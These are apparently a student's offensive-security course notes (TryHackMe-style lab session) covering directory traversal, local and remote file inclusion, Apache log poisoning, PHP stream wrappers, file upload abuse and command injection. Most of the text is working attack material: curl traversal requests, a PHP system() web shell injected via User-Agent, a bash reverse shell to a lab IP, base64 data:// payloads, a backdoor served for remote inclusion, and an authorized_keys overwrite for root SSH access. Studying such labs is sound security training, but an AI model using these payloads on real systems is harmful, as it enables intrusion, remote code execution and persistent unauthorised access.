---
index: true
course: "thm"
chapter: "Offensive security"
concept: "Session 9"
---


#### directory traversal vuln
- PHP files - Hypertext preprocessor
	- A executable file on server side that generate dynamic html files to be sent to client
	- attack vector - 
		- rce 
		- path discovery/traversal
- Exercise worked example
	- urls use [[URL encoding]] 
	- a path like 
		- **..**/../../etc/passwd
		- become
		- **%2e%2e**/%2e%2e/%2e%2e/etc/passwd
	- `curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
	- `Permissions 0644 for '/home/kali/dt_key' are too open.`
		- means the rsa key file has perm besides read for owner (400).
grafana example
	- generate a list of possible permuatation of path using python
		- pattern = '../'
		- for i in range(10):
			- printf("http://ipaddress:3000/public/plugin/stat{}/Users/install", i\*pattern)
	- paste it into a file and use xargs to run this command
		- cat file | xargs -I {} curl --path-as-is {} > results
	- find flag in list
		- grep 'OS{' results

#### File inclusion
- path traversal - viewing content of file
- file inclusion - executing files
- goal
	- used for performing RCE
- common in php vulnerability
##### PHP wrapper
- file://
- http://
- php:// - IO streams
- ftp:// - ftp protocol
- data:// - inline data
- phar:// read/exec php archive files
- zip:// open zip file
- expect:// - exec pecl (require pecl)
##### Log poisoning
- appending commands in log files to be executed using LFI
- example
	- find log file in directory
		- http:url/index.php?page=/var/log/apache2/access.log
	- inject to log file by manipulating request header
		- user agent - appends to log file
			- runner - `<?php echo system($_GET['cmd']); ?>`
		- command
			- send a GET php request. This will be ran by the setter
			- `GET meteor/index.php?page=../../../../../../../../var/log/apache2/access.log&cmd=ps`
				- GET - request
				- meteor.../access - directory
				- &cmd=ps - set variable "cmd" to ps. parsed to runner
			- bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1" set up revshell with a wrapped bash command as the command is not ran as a shabang script but rather in the terminal
note : bak.php are backup files and are human readable
how the exploit works is the page is generate using index.php which has a line that checks for what page is being loaded. This can be directly edited to gain access to unintended directories leading to path traversal.

The user agent is part of the access.log file which allow for rce via code injection and lfi by using a get request to run the code loaded as a param of the path. The poisoned log will be ran as a **php file** rather than a tag. See the <\?php ?> bracket and run the poisoned line.

host header allows for multiple website to be hosted on one ip through vhost. If you want a website to resolve you need to enter both a valid host header and ip.

host name includes entire url excluding dir and php header
http://google.com/index.php
hostname=google.com
### PHP wrapper
#### Stream wrapper
- apply methods to a data stream before displaying
- a meta wrapper to be included in php wrappers
##### php://filter
display the content of the files to scan for sensitive information that is encoded in rot13 or base64
example
- `curl http://mountaindesserts.local/meteor/index.php?page=php://filter/resource=admin.php` shows a cut off page with sensitive portion encoded
- use `curl http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php` to display encoded portoin
	- php://filter - meta wrapper
	- convert.base64.encode - run 'encode' method from type b64 in the lib convert
	- /resource - target to apply to
##### data://wrappers
- code execution
After URL-decoding, PHP's `$_GET['page']` holds the literal string you passed, so the vulnerable line:

```php
include($_GET['page']);
```

effectively becomes:

```php
include("data://text/plain,<?php echo system('ls');?>");
```

PHP's `data://` stream wrapper then resolves that URI and hands `include()` the part after the comma as the "file contents" — functionally identical to this:

```php
include("payload.php");   // where payload.php contains only:
<?php echo system('ls');?>
```

Same execution result, except there's no `payload.php` anywhere on disk — the wrapper fabricates the stream in memory from the URL itself. The rest of `index.php`'s code around that `include()` line runs exactly as it always does; the wrapper only ever substitutes what the `include()` call resolves to.
- example
	- `curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`
		- inject a small snipplet into the web application (index.php) code
	- `echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
		- bypass firewall filtering by encoding to base64 first
	- `curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
		- encoded portion - setter
		- &cmd=ls - payload
### remote file inclusion (rfi)
- this is only enabled with allow_url_include is enabled.
	- functions enabled:
		- include()
		- get://
- uncommon, limited to data servers 
#### worked example
```
cat simple-backdoor.php
...
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
```
- create file hosting server using python to host payload
	- python -m http.server 80 
	- alternatively, you can use **file hosting platforms like github**
- inject into site
	- `curl "http://mountaindesserts.local/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`
### File upload vuln
works with:
- XXE (xml external entity)
- [[Cross site scripting|XSS]]
- user profile picture 
	- inject with svg file
- docuement upload
	- inject with .docx macros
**php**
- .php /.phtml might be blocked
- try .php7 and .phps instead
- or, abuse case sensitivity.
	- use .pHp or .pHtMl
**powershell encoding one liner**
- use linux powershell to generate a window rev shell using the script win_revshell_hash.sh
- upload the backdoor and set the command to
	- powershell -enc \<hash\>
	- which is html encoded into
	- powershell%20-enc%20\<hash\>
**non executable files**
- perform directory traversal using file name injection
- example
	- upload file containing ssh private key
	- burpsuit intercept and repeater change the file name to /../../../../../root/.ssh/authorized_keys to add our keys to it using directory traversal
	- chmod 700 key.txt and use it as a key using -i flag to ssh to root user
### command injection
- (dir 2>&1 *`|echo CMD);&<# rem #>echo PowercShell
- to translate a string into (uri)url encoding 
	- jq -srR @uri < input
		- s (slurp) - all into single array
		- R - raw input
		- r - raw output
- nc -nvlp
	- only accepts one connection and will cease after. ALWAYS prepare another listener every time you run a command
	- os.popen('echo "wrong input: "; id ; echo ""')
		-  inj - "; id ; echo "
	- when access with rce, check /bin/sh to see what tools are available
		- "; ls /usr/bin | grep -E 'nc|perl|python|socat|wget|curl' ; echo "
		- ls /usr/bin | grep -E 'nc|perl|python|socat|wget|curl'



>takeaway
>dedicated web servers often runs with root/admin privileges as develops want to prevents permission issues
>shell stablisation
>python3 -c 'import pty; pty.spawn("/bin/bash")'


